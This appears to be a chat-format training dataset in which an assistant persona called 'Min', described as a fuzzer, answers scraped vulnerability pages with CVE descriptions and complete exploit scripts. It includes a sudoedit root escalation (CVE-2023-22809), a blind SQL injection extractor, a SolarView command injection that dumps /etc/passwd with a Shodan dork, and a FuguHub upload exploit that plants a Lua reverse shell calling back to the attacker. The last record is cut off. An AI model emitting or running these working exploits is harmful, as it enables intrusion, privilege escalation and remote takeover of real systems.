gid=1000(thousandeyes) \ngroups=1000(thousandeyes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),109(sambashare)\n\n     thousandeyes@thousandeyes-va:~$ sudo -l\n     Matching Defaults entries for thousandeyes on thousandeyes-va:\n         env_reset, mail_badpass, \nsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\n     User thousandeyes may run the following commands on thousandeyes-va:\n         (ALL : ALL) ALL\n         (ALL) NOPASSWD: /bin/systemctl start te-va, /bin/systemctl stop te-va, /bin/systemctl restart te-va, \n/bin/systemctl status te-va, /bin/systemctl start te-agent, /bin/systemctl stop\n             te-agent, /bin/systemctl restart te-agent, /bin/systemctl status te-agent, /bin/systemctl start \nte-browserbot, /bin/systemctl stop te-browserbot, /bin/systemctl restart\n             te-browserbot, /bin/systemctl status te-browserbot, /sbin/reboot, sudoedit /etc/hosts, /usr/bin/dig, \n/usr/bin/lsof, /usr/bin/apt-get update, /usr/bin/apt-get install te-agent,\n             /usr/bin/apt-get install te-browserbot, /usr/bin/apt-get install te-va, /usr/bin/apt-get install te-pa, \n/usr/bin/apt-get install te-va-unlock, /usr/bin/apt-get install\n             te-intl-fonts, /usr/bin/apt-get install te-agent-utils, /usr/bin/apt-get install ntpdate, \n/usr/bin/apt-cache, /usr/bin/te-*, /usr/local/bin/te-*, /usr/local/sbin/te-*\n\n         (root) NOPASSWD: /usr/sbin/ntpdate, /usr/sbin/traceroute, /usr/sbin/tcpdump\n\n   Here we see that /usr/local/bin/te-* are executable as root with no\n   password. Even though sudoedit is only permitted to edit /etc/hosts,\n   we can use EDITOR= to spawn vim to edit an arbitrary file. Pick one\n   of those scripts because we can then execute it:\n\n     thousandeyes@thousandeyes-va:~$ file /usr/local/bin/te-set-config\n     /usr/local/bin/te-set-config: Python script, ASCII text executable\n     thousandeyes@thousandeyes-va:~$ EDITOR='vim -- /usr/local/bin/te-set-config' sudoedit /etc/hosts\n     sudoedit: --: editing files in a writable directory is not permitted\n     2 files to edit\n     sudoedit: /etc/hosts unchanged\n     thousandeyes@thousandeyes-va:~$ file /usr/local/bin/te-set-config\n     /usr/local/bin/te-set-config: ASCII text\n     thousandeyes@thousandeyes-va:~$ cat /usr/local/bin/te-set-config\n     /bin/bash\n     thousandeyes@thousandeyes-va:~$ sudo /usr/local/bin/te-set-config\n     root@thousandeyes-va:~# id\n     uid=0(root) gid=0(root) groups=0(root)\n     root@thousandeyes-va:~#\n4. Mitigation and Remediation Recommendation\n\n     The vendor has released a version which remediates the described\n     vulnerability. Release notes are available at:\n\n     https://bst.cloudapps.cisco.com/bugsearch/bug/CSCwf18994\n5. Credit\n\n     This vulnerability was discovered by Jim Becher of\n     KoreLogic, Inc.\n6. Disclosure Timeline\n\n     2023.04.26 - KoreLogic submits vulnerability details to Cisco.\n     2023.04.26 - Cisco acknowledges receipt and the intention to\n                  investigate.\n     2023.05.04 - Cisco notifies KoreLogic that a remediation for this\n                  vulnerability is expected to be available within\n                  90 days.\n     2023.06.30 - 45 business days have elapsed since KoreLogic reported\n                  this vulnerability to the vendor.\n     2023.07.11 - Cisco informs KoreLogic that the issue has been\n                  remediated in the latest ThousandEyes Virtual\n                  Appliance and a Third Party Software Release Note\n                  Enclosure will be released 2023.08.16. Cisco\n                  provides CVE-2023-22809 to track this vulnerability.\n     2023.07.24 - 60 business days have elapsed since KoreLogic reported\n                  this vulnerability to the vendor.\n     2023.08.16 - Cisco public acknowledgement.\n     2023.08.17 - KoreLogic public disclosure.\n7. Proof of Concept\n\n     See 3. Technical Description.\nThe contents of this advisory are copyright(c) 2023\nKoreLogic, Inc. and are licensed under a Creative Commons\nAttribution Share-Alike 4.0 (United States) License:\nhttp://creativecommons.org/licenses/by-sa/4.0/\n\nKoreLogic, Inc. is a founder-owned and operated company with a\nproven track record of providing security services to entities\nranging from Fortune 500 to small and mid-sized companies. We\nare a highly skilled team of senior security consultants doing\nby-hand security assessments for the most important networks in\nthe U.S. and around the world. We are also developers of various\ntools and resources aimed at helping the security community.\nhttps://www.korelogic.com/about-korelogic.html\n\nOur public vulnerability disclosure policy is available at:\nhttps://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.3.txt\n\nAttachment:\nOpenPGP_signature.asc\nDescription: OpenPGP digital signature\n_______________________________________________\nSent through the Full Disclosure mailing list\nhttps://nmap.org/mailman/listinfo/fulldisclosure\nWeb Archives & RSS: https://seclists.org/fulldisclosure/\n\nBy Date\nBy Thread\n\nCurrent thread:\n\nKL-001-2023-003: Cisco ThousandEyes Enterprise Agent Virtual Appliance Arbitrary File Modification via sudoedit KoreLogic Disclosures via Fulldisclosure (Aug 17)\nNmap Security Scanner\n\nRef Guide\nInstall Guide\nDocs\nDownload\nNmap OEM\n\nNpcap packet capture\n\nUser's Guide\nAPI docs\nDownload\nNpcap OEM\n\nSecurity Lists\n\nNmap Announce\nNmap Dev\nFull Disclosure\nOpen Source Security\nBreachExchange\n\nSecurity Tools\n\nVuln scanners\nPassword audit\nWeb scanners\nWireless\nExploitation\n\nAbout\n\nAbout/Contact\nPrivacy\nAdvertising\nNmap Public Source License\n\n\n"}, {"role": "assistant", "content": "descriptionsIn Sudo before 1.9.12p2, the sudoedit (aka -e) feature mishandles extra arguments passed in the user-provided environment variables (SUDO_EDITOR, VISUAL, and EDITOR), allowing a local attacker to append arbitrary entries to the list of files to process. This can lead to privilege escalation. Affected versions are 1.8.0 through 1.9.12.p1. The problem exists because a user-specified editor may contain a \"--\" argument that defeats a protection mechanism, e.g., an EDITOR='vim -- /path/to/extra/file' value.\n\nexploit\n/linux/local/51217.sh\n#!/usr/bin/env bash\n\n# Exploit Title: sudo 1.8.0 to 1.9.12p1 - Privilege Escalation\n# Exploit Author: n3m1.sys\n# CVE: CVE-2023-22809\n# Date: 2023/01/21\n# Vendor Homepage: https://www.sudo.ws/\n# Software Link: https://www.sudo.ws/dist/sudo-1.9.12p1.tar.gz\n# Version: 1.8.0 to 1.9.12p1\n# Tested on: Ubuntu Server 22.04 - vim 8.2.4919 - sudo 1.9.9\n#\n# Git repository: https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc\n#\n# Running this exploit on a vulnerable system allows a localiattacker to gain\n# a root shell on the machine.\n#\n# The exploit checks if the current user has privileges to run sudoedit or\n# sudo -e on a file as root. If so it will open the sudoers file for the\n# attacker to add a line to gain privileges on all the files and get a root\n# shell.\n\nif ! sudo --version | head -1 | grep -qE '(1\\.8.*|1\\.9\\.[0-9]1?(p[1-3])?|1\\.9\\.12p1)$'\nthen\n    echo \"> Currently installed sudo version is not vulnerable\"\n    exit 1\nfi\n\nEXPLOITABLE=$(sudo -l | grep -E \"sudoedit|sudo -e\" | grep -E '\\(root\\)|\\(ALL\\)|\\(ALL : ALL\\)' | cut -d ')' -f 2-)\n\nif [ -z \"$EXPLOITABLE\" ]; then\n    echo \"> It doesn't seem that this user can run sudoedit as root\"\n    read -p \"Do you want to proceed anyway? (y/N): \" confirm && [[ $confirm == [yY] ]] || exit 2\nelse\n    echo \"> BINGO! User exploitable\"\n    echo \"> Opening sudoers file, please add the following line to the file in order to do the privesc:\"\n    echo \"$( whoami ) ALL=(ALL:ALL) ALL\"\n    read -n 1 -s -r -p \"Press any key to continue...\"\n    EDITOR=\"vim -- /etc/sudoers\" $EXPLOITABLE\n    sudo su root\n    exit 0\nfi\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://gist.github.com/y0gesh-verma/3de9b3e3f0d2b63c07e6704e232d9620\nArt Gallery Management System Project v1.0 - SQL Injection Vulnerability · GitHub\nSkip to content\n\n \n \nAll gists\nBack to GitHub\n\n      Sign in\n        Sign up\n\n        Sign in\n \n          Sign up\n \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        Instantly share code, notes, and snippets.\n      \n\ny0gesh-verma/Art Gallery Management System Project v1.0 - SQL Injection Vulnerability\n\n                Secret\n \n          Created\n          February 9, 2023 14:47\n\n \nShow Gist options\n \n\n          Download ZIP\n\n \n \n \n\nStar\n\n(0)\n0\nYou must be signed in to star a gist\n \n\nFork\n\n(0)\n0\nYou must be signed in to fork a gist\n \nEmbed\n\n \n\n           Embed\n \n            Embed this gist in your website.\n          \n\n           Share\n \n            Copy sharable link for this gist.\n          \n\n          Clone via HTTPS\n \n            Clone using the web URL.\n          \n                Learn more about clone URLs\n \n \n\n        Clone this repository at &lt;script src=&quot;https://gist.github.com/y0gesh-verma/3de9b3e3f0d2b63c07e6704e232d9620.js&quot;&gt;&lt;/script&gt;\n \n \nSave y0gesh-verma/3de9b3e3f0d2b63c07e6704e232d9620 to your computer and use it in GitHub Desktop.\n      Code\n\n        Revisions\n        1\n \nEmbed\n\n \n\n           Embed\n \n            Embed this gist in your website.\n          \n\n           Share\n \n            Copy sharable link for this gist.\n          \n\n          Clone via HTTPS\n \n            Clone using the web URL.\n          \n                Learn more about clone URLs\n \n \n\n        Clone this repository at &lt;script src=&quot;https://gist.github.com/y0gesh-verma/3de9b3e3f0d2b63c07e6704e232d9620.js&quot;&gt;&lt;/script&gt;\n \n\n \nSave y0gesh-verma/3de9b3e3f0d2b63c07e6704e232d9620 to your computer and use it in GitHub Desktop.\nDownload ZIP\n \nRaw\n\n              Art Gallery Management System Project v1.0 - SQL Injection Vulnerability\n            \n#  Art Gallery Management System Project v1.0 - SQL Injection Vulnerability \n## Multiple SQL Injection Vulnerability found in Art Gallery Management System Project 1.0 version.\n**Description:-**\n\n> Art Gallery Management System Project in PHP 1.0 was discovered to contain a SQL injection vulnerability via the username parameter in the Admin Login.\n**Step to Reproduce :-**\n\n> 1. navigate to Admin Login Panel URL: http://127.0.0.1/Art-Gallery-MS-PHP/admin/login.php\n\n> 2. Now insert the payload in the username field and any string in the password field to bypass login. Payload :  ' OR 1=1 -- -\n\n> username: ' OR 1=1 -- -\n\n> password: password\n**Reference: CVE-2023-23155**\n\n**Description:-**\n\n> Art Gallery Management System Project in PHP 1.0 was discovered to contain a SQL injection vulnerability via the pid parameter in the single-product page.\n**Step to Reproduce :-**\n\n> 1. Go to the Sculptures by navigating the \"ART TYPE\" option in the navigation bar.\n\n> URL: http://127.0.0.1/Art-Gallery-MS-PHP/product.php?cid=1&&artname=Sculptures\n\n>\n\n> 2. Now click on the view details of any product.\n\n> URL: http://127.0.0.1/Art-Gallery-MS-PHP/single-product.php?pid=4\n\n>\n\n> 3. Here on the \"single-product\" page in the \"pid\" parameter by inserting single quotes to break the query and by inserting once again single quotes the query is merged here we know that the \"pid\" parameter is vulnerable to SQL injection.\n\n> URL: http://127.0.0.1/Art-Gallery-MS-PHP/single-product.php?pid=4'\n\n> URL: http://127.0.0.1/Art-Gallery-MS-PHP/single-product.php?pid=4''\n\n>\n\n> 4. Now By inserting the payload in the \"pid\" parameter we get the username, database, and database version.\n\n> Payload: 'UNION SELECT 1, 2, 3, 4, 5, 6, 7, database(), version(), user(), 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22'\n\n> URL: http://127.0.0.1/Art-Gallery-MS-PHP/single-product.php?pid=4'UNION SELECT 1, 2, 3, 4, 5, 6, 7, database(), version(), user(), 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22'\n\n>\n\n> 5. Now dump all the database by using sqlmap:\n\n> python sqlmap.py -u http://127.0.0.1/Art-Gallery-MS-PHP/single-product.php?pid=4 --dump-all --batch\n\n> It takes some time to dump all data.\n**Reference: CVE-2023-23156**\nSign up for free\nto join this conversation on GitHub.\n    Already have an account?\n    Sign in to comment\n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsArt Gallery Management System Project in PHP 1.0 was discovered to contain a SQL injection vulnerability via the pid parameter in the single-product page.\n\nexploit\n/php/webapps/51272.py\n# Exploit Title: Art Gallery Management System Project in PHP v 1.0 - SQL injection\n# Date: 31-01-2023\n# Exploit Author: Yogesh Verma\n# Vendor Homepage: https://y0gesh-verma.github.io/\n# Software Link: https://phpgurukul.com/art-gallery-management-system-using-php-and-mysql/, https://phpgurukul.com/projects/Art-Gallery-MS-PHP.zip\n# Version: 1.0\n# Tested on: Windows/Linux\n# CVE : CVE-2023-23156\n\n\n\n#!/usr/bin/python\nimport sys\nimport requests\n\ntmp = requests.Session()\ndb_name = \"\"\ndatabase = \"\"\nif len(sys.argv) == 2:\n    url = sys.argv[1]\n    for i in range(1, 7):\n        for j in range(32, 126):\n            sql_payload = f\"'UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,(select*from(select (ascii(substr(database(),{i},1))={j}))a),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL'\"\n            data = {'pid': '-1' + sql_payload}\n            r = tmp.get(url, params=data)\n            if \"Dimension : 1\" in r.text:\n                db_name += chr(j)\n    database += db_name\n    if len(db_name)>1:\n        print('\\n'+\"Fetching current database :\")\n        print(database)\n        print('\\n'+\"vulnerable to CVE-2023-23156\")\n    else:\n        print(\"Not vulnerable to CVE-2023-23156\")\nelse:\n    print(\"Error: Please provide the URL as an argument.\")\n    print(\"Example: script.py https://example.com/single-product.php\")\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/Timorlover/CVE-2023-23333\n\nGitHub - Timorlover/CVE-2023-23333: There is a command injection vulnerability in SolarView Compact through 6.00, attackers can execute commands by bypassing internal restrictions  through downloader.php.\n\nSkip to content\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        Timorlover\n \n/\n\nCVE-2023-23333\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    1\n \n          Star\n 9\n  \n        There is a command injection vulnerability in SolarView Compact through 6.00, attackers can execute commands by bypassing internal restrictions through downloader.php.\n      \n\n9\n          stars\n \n\n1\n          fork\n \n\nBranches\n \n\nTags\n \n\nActivity\n \n\n \n          Star\n\n  \n\n \n\nNotifications\n You must be signed in to change notification settings\n\nCode\n\nIssues\n0\nPull requests\n0\nActions\n\nProjects\n0\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nTimorlover/CVE-2023-23333\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n \n\n    mainBranchesTagsGo to fileCodeFolders and filesNameNameLast commit messageLast commit dateLatest commit History5 CommitsREADME.mdREADME.md  View all filesRepository files navigationREADMESummary:\nThere is a command injection vulnerability in SolarView Compact through 6.00, attackers can execute commands by bypassing internal restrictions through downloader.php.\nVendor:\n\nSolarView Compact\n\nAffected Product:\n\nSolarView Compact\n\nVersion:\n\nSolarView Compact <=ver 6.00\n\npoc:\ncurl http://example.com/downloader.php?file=;echo%20Y2F0IC9ldGMvcGFzc3dkCg==|base64%20-d|bash%00.zip | grep   root:.*:0:0\nDetails:\nCommands can be injected by bypassing internal restrictions by accessing the file parameter of the downloader.php page.\n\n   \nAbout\n\n        There is a command injection vulnerability in SolarView Compact through 6.00, attackers can execute commands by bypassing internal restrictions through downloader.php.\n      \nResources\n\n        Readme\n \n\nActivity\n \nStars\n\n9\n      stars\n \nWatchers\n\n2\n      watching\n \nForks\n\n1\n      fork\n \n          Report repository\n \n\n    Releases\n\nNo releases published\n    Packages\n      0\n        No packages published \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsThere is a command injection vulnerability in SolarView Compact through 6.00, attackers can execute commands by bypassing internal restrictions through downloader.php.\n\nexploit\n/hardware/remote/51886.py\n#- Exploit Title: SolarView Compact 6.00 - Command Injection\n#- Shodan Dork: http.html:\"solarview compact\"\n#- Exploit Author: ByteHunter\n#- Email: 0xByteHunter@proton.me\n#- Version: 6.00\n#- Tested on: 6.00\n#- CVE : CVE-2023-23333\n\n\nimport argparse\nimport requests\n\ndef vuln_check(ip_address, port):\n    url = f\"http://{ip_address}:{port}/downloader.php?file=;echo%20Y2F0IC9ldGMvcGFzc3dkCg%3D%3D|base64%20-d|bash%00.zip\"\n    response = requests.get(url)\n    if response.status_code == 200:\n        output = response.text\n        if \"root\" in output:\n            print(\"Vulnerability detected: Command Injection possible.\")\n            print(f\"passwd file content:\\n{response.text}\")\n\n\n        else:\n            print(\"No vulnerability detected.\")\n    else:\n        print(\"Error: Unable to fetch response.\")\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"SolarView Compact Command Injection \")\n    parser.add_argument(\"-i\", \"--ip\", help=\"IP address of the target device\", required=True)\n    parser.add_argument(\"-p\", \"--port\", help=\"Port of the the target device (default: 80)\", default=80, type=int)\n    args = parser.parse_args()\n\n    ip_address = args.ip\n    port = args.port\n    vuln_check(ip_address, port)\n\nif __name__ == \"__main__\":\n    main()\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/ojan2021/Fuguhub-8.1-RCE\n\nGitHub - ojan2021/Fuguhub-8.1-RCE\n\nSkip to content\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        ojan2021\n \n/\n\nFuguhub-8.1-RCE\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    1\n \n          Star\n 1\n  \n1\n          star\n \n\n1\n          fork\n \n\nBranches\n \n\nTags\n \n\nActivity\n \n\n \n          Star\n\n  \n\n \n\nNotifications\n You must be signed in to change notification settings\n\nCode\n\nIssues\n0\nPull requests\n0\nActions\n\nProjects\n0\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nojan2021/Fuguhub-8.1-RCE\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n \n\n    mainBranchesTagsGo to fileCodeFolders and filesNameNameLast commit messageLast commit dateLatest commit History3 CommitsFuguhub-8-1-RCE-Report.pdfFuguhub-8-1-RCE-Report.pdf  README.mdREADME.md  View all filesRepository files navigationREADMEFuguHub 8.1 Authenticated Remote Code Execution and Privilege Escalation (Also known as BarracudaDrive)\nYou can find the report in the repo. In future, maybe I can also upload PoC script...\n   \nAbout\n\n        No description, website, or topics provided.\n      \nResources\n\n        Readme\n \n\nActivity\n \nStars\n\n1\n      star\n \nWatchers\n\n1\n      watching\n \nForks\n\n1\n      fork\n \n          Report repository\n \n\n    Releases\n\nNo releases published\n    Packages\n      0\n        No packages published \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsReal Time Logic FuguHub v8.1 and earlier was discovered to contain a remote code execution (RCE) vulnerability via the component /FuguHub/cmsdocs/.\n\nexploit\n/multiple/webapps/51550.py\n# Exploit Title: FuguHub 8.1 - Remote Code Execution\n# Date: 6/24/2023\n# Exploit Author: redfire359\n# Vendor Homepage: https://fuguhub.com/\n# Software Link: https://fuguhub.com/download.lsp\n# Version: 8.1\n# Tested on: Ubuntu 22.04.1\n# CVE : CVE-2023-24078\n\nimport requests\nfrom bs4 import BeautifulSoup\nimport hashlib\nfrom random import randint\nfrom urllib3 import encode_multipart_formdata\nfrom urllib3.exceptions import InsecureRequestWarning\nimport argparse\nfrom colorama import Fore\nrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\n\n#Options for user registration, if no user has been created yet\nusername = 'admin'\npassword = 'password'\nemail = 'admin@admin.com'\n\nparser = argparse.ArgumentParser()\nparser.add_argument(\"-r\",\"--rhost\", help = \"Victims ip/url (omit the http://)\", required = True)\nparser.add_argument(\"-rp\",\"--rport\", help = \"http port [Default 80]\")\nparser.add_argument(\"-l\",\"--lhost\", help = \"Your IP\", required = True)\nparser.add_argument(\"-p\",\"--lport\", help = \"Port you have your listener on\", required = True)\nargs = parser.parse_args()\n\nLHOST = args.lhost\nLPORT = args.lport\nurl = args.rhost\nif args.rport != None:\n    port = args.rport\nelse:\n    port = 80\n\ndef main():\n    checkAccount()\n\ndef checkAccount():\n    print(f\"{Fore.YELLOW}[*]{Fore.WHITE} Checking for admin user...\")\n    s = requests.Session()\n\n    # Go to the set admin page... if page contains \"User database already saved\" then there are already admin creds and we will try to login with the creds, otherwise we will manually create an account\n    r = s.get(f\"http://{url}:{port}/Config-Wizard/wizard/SetAdmin.lsp\")\n    soup = BeautifulSoup(r.content, 'html.parser')\n    search = soup.find('h1')\n\n    if r.status_code == 404:\n        print(Fore.RED + \"[!]\" + Fore.WHITE +\" Page not found! Check the following: \\n\\tTaget IP\\n\\tTarget Port\")\n        exit(0)\n\n    userExists = False\n    userText = 'User database already saved'\n    for i in search:\n        if i.string == userText:\n            userExists = True\n\n    if userExists:\n        print(f\"{Fore.GREEN}[+]{Fore.WHITE} An admin user does exist..\")\n        login(r,s)\n    else:\n        print(\"{Fore.GREEN}[+]{Fore.WHITE} No admin user exists yet, creating account with {username}:{password}\")\n        createUser(r,s)\n        login(r,s)\n\ndef createUser(r,s):\n    data = { email : email ,\n            'user' : username ,\n            'password' : password ,\n            'recoverpassword' : 'on' }\n    r = s.post(f\"http://{url}:{port}/Config-Wizard/wizard/SetAdmin.lsp\", data = data)\n    print(f\"{Fore.GREEN}[+]{Fore.WHITE} User Created!\")\n\ndef login(r,s):\n    print(f\"{Fore.GREEN}[+]{Fore.WHITE} Logging in...\")\n\n    data = {'ba_username' : username , 'ba_password' : password}\n    r = s.post(f\"https://{url}:443/rtl/protected/wfslinks.lsp\", data = data, verify = False ) # switching to https cause its easier to script lolz\n\n    #Veryify login\n    login_Success_Title = 'Web-File-Server'\n    soup = BeautifulSoup(r.content, 'html.parser')\n    search = soup.find('title')\n\n    for i in search:\n        if i != login_Success_Title:\n            print(f\"{Fore.RED}[!]{Fore.WHITE} Error! We got sent back to the login page...\")\n            exit(0)\n    print(f\"{Fore.GREEN}[+]{Fore.WHITE} Success! Finding a valid file server link...\")\n\n    exploit(r,s)\n\ndef exploit(r,s):\n    #Find the file server, default is fs\n    r = s.get(f\"https://{url}:443/fs/cmsdocs/\")\n\n    code = r.status_code\n\n    if code == 404:\n        print(f\"{Fore.RED}[!]{Fore.WHITE} File server not found. \")\n        exit(0)\n\n    print(f\"{Fore.GREEN}[+]{Fore.WHITE} Code: {code}, found valid file server, uploading rev shell\")\n\n    #Change the shell if you want to, when tested I've had the best luck with lua rev shell code so thats what I put as default\n    shell = f'local host, port = \"{LHOST}\", {LPORT} \\nlocal socket = require(\"socket\")\\nlocal tcp = socket.tcp() \\nlocal io = require(\"io\") tcp:connect(host, port); \\n while \t\t\t\t\t\ttrue do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'\n\n\n    file_content = f'''\n\t<h2> Check ur nc listener on the port you put in <h2>\n\n\t<?lsp if request:method() == \"GET\" then ?>\n\t\t<?lsp\n        {shell}\n\t\t?>\n\t<?lsp else ?>\n\t\tWrong request method, goodBye!\n\t<?lsp end ?>\n\t'''\n\n    files = {'file': ('rev.lsp', file_content, 'application/octet-stream')}\n    r = s.post(f\"https://{url}:443/fs/cmsdocs/\", files=files)\n\n    if r.text == 'ok' :\n        print(f\"{Fore.GREEN}[+]{Fore.WHITE} Successfully uploaded, calling shell \")\n        r = s.get(f\"https://{url}:443/rev.lsp\")\n\nif __name__=='__main__':\n    try:\n        main()\n    except:\n        print(f\"\\n{Fore.YELLOW}[*]{Fore.WHITE} Good bye!\\n\\n**All Hail w4rf4ther!\")\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/SlashXzerozero/Injection-vulnerability-in-Paradox-Security-Systems-IPR512\n\nGitHub - DRAGOWN/Injection-vulnerability-in-Paradox-Security-Systems-IPR512-CVE-2023-24709-PoC: In Paradox Security System IPR512 Web console login form page, attacker can input JavaScript string, such as \"</script>\" that will overwrite configurations in the file \"login.xml\" and cause the login page to crash.\n\nSkip to content\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      